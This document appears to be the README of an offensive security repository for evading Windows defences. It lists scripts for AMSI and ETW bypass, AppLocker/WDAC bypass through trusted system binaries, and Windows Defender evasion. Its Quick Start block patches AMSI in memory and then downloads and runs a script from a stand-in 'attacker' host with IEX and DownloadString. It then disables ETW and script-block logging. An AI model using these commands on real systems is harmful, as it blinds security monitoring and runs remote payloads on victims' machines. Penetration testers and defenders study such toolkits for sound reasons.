# Windows Defense Evasion

Bypass security controls during authorized penetration testing.

> **MITRE ATT&CK**: T1562, T1218, T1027, T1059

## Files

| File | Description |
|------|-------------|
| [`amsi_bypass.ps1`](amsi_bypass.ps1) | AMSI bypass techniques — amsiInitFailed flag, reflection context null, AmsiScanBuffer memory patch, PowerShell downgrade, CLM bypass, string obfuscation patterns. Functions + AMSI status check (T1562.001) |
| [`etw_bypass.ps1`](etw_bypass.ps1) | ETW bypass — EtwEventWrite patch, ScriptBlock logging disable (registry + in-memory), Module logging disable, Transcription disable, .NET CLR ETW disable (T1562.001) |
| [`applocker_bypass.md`](applocker_bypass.md) | AppLocker/WDAC bypass — MSBuild, InstallUtil, Regsvcs/Regasm, CMSTP, Mshta, Rundll32, Regsvr32, WMIC, CertUtil, trusted writable paths, ADS, CLM bypass. Full commands and payload templates (T1218) |
| [`defender_evasion.md`](defender_evasion.md) | Windows Defender evasion — status checks, disable methods, exclusion abuse, EICAR test, string obfuscation, payload encryption (AES/XOR), in-memory execution, reflective loading, syscall stubs, ASR rules check (T1562.001, T1027) |

## Quick Start

```powershell
# Bypass AMSI then execute payload
. .\amsi_bypass.ps1
Bypass-AmsiMemoryPatch
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')

# Disable logging before operations
. .\etw_bypass.ps1
Bypass-ETWPatch
Disable-ScriptBlockLoggingInMemory
```
